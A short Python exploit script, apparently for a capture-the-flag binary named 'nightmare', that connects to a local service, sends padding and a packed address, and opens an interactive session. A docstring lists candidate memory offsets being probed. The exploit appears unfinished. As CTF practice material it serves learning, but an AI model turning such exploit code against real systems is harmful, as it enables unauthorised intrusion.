#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./nightmare')
host = args.HOST or '0.0.0.0'
port = int(args.PORT or 1337)

gdbscript = '''
tbreak main
b *nightmare
b *nightmare+136
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()

# s(p64(2469904+i-1))
# s(p64(2469904-0x20))
s(b"A"*8)
s(p64(2535512))
print(re())
io.interactive()

"""
2535448
2535512
2535520
2536184
2536736
2536744
2543600
2544504
2544512
2544520
"""
